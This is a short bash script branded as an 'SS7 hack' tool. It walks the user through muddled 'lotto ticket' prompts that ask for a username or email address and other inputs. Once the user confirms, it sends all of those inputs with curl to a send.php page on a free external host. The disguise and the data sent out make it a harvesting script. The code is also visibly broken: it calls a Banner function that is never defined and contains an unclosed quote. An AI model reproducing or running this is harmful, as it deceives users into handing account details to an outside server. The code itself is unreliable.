#!/bin/bash
clear


voyeYonMesaj(){
clear

        echo 'By: SS7 PROGRAMATION HACKS @CANAL SS7HACK https://www.ss7hack.php/c/SS7PROGRAMATIONSCHOOL/'
		
		echo 'Enter the ID of the computer you wish to interpret'
		read remitente
		clear
		
		echo 'Fils Polos -->' $remitente
		echo 'Welcome to Fils Polos Lotto please create your ticket'
		read receptor
		clear
		
		echo 'Fils Polos -->' $remitente
		echo 'Welcome Fils Polos Lotto, please create your ticket -->' $receptor
		echo 'Enter username or email address'
		read asunto 
		clear
		
		echo 'Fils Polos -->' $remitente
		echo 'Welcome to Fils Polos Lotto, please create your ticket -->' $receptor
		echo 'Enter username or email address -->' $asunto
		echo 'Incorrect username tries to hack the system'
		read mensaje
		clear
		
		echo 'Fils Polos -->' $remitente
		echo 'Welcome to Fils Polos Lotto, please create your ticket -->' $receptor
		echo 'Enter username or email address -->' $asunto
		echo 'Incorrect username tries to hack the system -->'$mensaje
		echo '¿Your username is incorrect the process failed? [y/n]' 
		read Seguro
		case $Seguro in
			y)
			curl --data "remitente=$receptor && asunto=$asunto && msj=$mensaje && desde=$remitente" https://insessorial-halls.000webhostapp.com/send.php  
				;;	
			n)
				clear
				Banner 
				menuPrincipal
		esac

}


menuPrincipal(){
clear
	
echo -e '\e[92mWELCOME'
echo ''
echo -To SS7 press y continue'
read opcion
case $opcion in 

	
	y)
	 voyeYonMesaj
	;;
								
	esac

}

Banner 
menuPrincipal
